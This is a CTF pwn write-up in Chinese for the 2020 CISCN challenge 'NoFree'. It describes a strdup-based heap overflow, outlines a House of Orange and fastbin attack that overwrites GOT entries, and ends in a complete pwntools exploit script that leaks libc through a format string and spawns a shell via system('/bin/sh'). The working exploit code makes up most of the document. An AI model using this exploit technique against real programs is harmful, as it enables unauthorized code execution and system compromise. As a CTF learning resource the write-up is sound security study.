# NoFree

## 来源
2020 ciscn


## 难度

5 / 10

## 保护

 ```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
 ```

## 简单描述

只有添加和编辑

## vul

```c
char *__fastcall sub_40095C(unsigned int size)
{
  memset(p_addr, 0, 0x100uLL);
  printf("content: ", 0LL);
  read_n(p_addr, size);
  return strdup(p_addr);
}
```



strdup函数相当于包含了strlen + malloc + strcpy 函数, 根据字符串长度来malloc, 然后strcpy到开辟的空间里,然后在输入一定大小后, 再输入内容,内容中若出现'\x00'字符截断, 则造成在edit模式堆溢出, 可以在同个index下开辟内存, 造成内存泄漏.

## 知识点

House of Orange, fastbin attack

## 思路

通过堆溢出漏洞修改top chunk 大小, 不断开辟内存, 直到开辟top chunk 快完毕, 使剩余的top chunk 为 fastbin size, 再开辟一块大的, 使剩余的部分为fastbin, 然后通过堆溢出修改fastbin fd为 p_addr + 0x100(堆指针数组), 在该数组中的大小要与fastbin 中的一致, 通过fastbin attack 打入 p_addr+ 0x100,  通过index 0控制 index 1 打入p_addr 设置字符串漏洞, 然后修改 memset 的got 表为printf的plt地址,再次开辟泄漏libc.再使用同样的方法修改atoi got表中的地址为system, 传入 '/bin/sh'即可 get shell



## exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'pwn'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(idx, size, data):
	sla('>>', str(1))
	sla(':', str(idx))
	sla(':', str(size))
	sa(':', data)

def md(idx, data):
	sla(':', str(2))
	sla(':', str(idx))
	sa(':', data)

#--------------------------Exploit--------------------------
def exploit():
	ad(0, 0x90, 'A')
	md(0, 'A' * 0x10 + p64(0) + p64(0xfe1))
	for i in range(24):
		ad(1, 0x90, 'A' *0x90)
	
	ad(0, 0x80, 'A' * 0x70)
	ad(0, 0x80, 'A' * 0x10) # idx 0
	ad(1, 0x40, 'A' * 0x40) # make it as 0x21 fastbin
	p_addr = 0x6020c0

	md(0, 'A' * 0x10 + p64(0x20) + p64(0x20) + p64(p_addr + 0x100))
	ad(0, 0x20, 'A') # Make the fastbin size as 0x20 for fastbin attaking
	ad(0, 0x20, p64(exe.got['memset']) + p64(0x10)) # modify memset got table as printf
	md(1, p64(exe.plt['printf'])) 

	md(0, p64(p_addr))
	md(1,'%17$p')

	# Add one to call print leak libc
	sla('>>', str(1))
	sla(':', str(2))
	sla(':', str(0x40))

	ru('0x')
	libc_base = int(ru('content'), 16) - (0x7ffff7a2d830 - 0x7ffff7a0d000)
	li('libc_base ' + hex(libc_base))
	sa(':', 'A' * 0x20)
	libc_sys = libc_base + lib.sym['system']

	# Modify atoi got tabel as system, then send /bin/sh to get shell
	md(0, p64(exe.got['atoi']))
	md(1, p64(libc_sys))
	sl('/bin/sh')

	

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

```

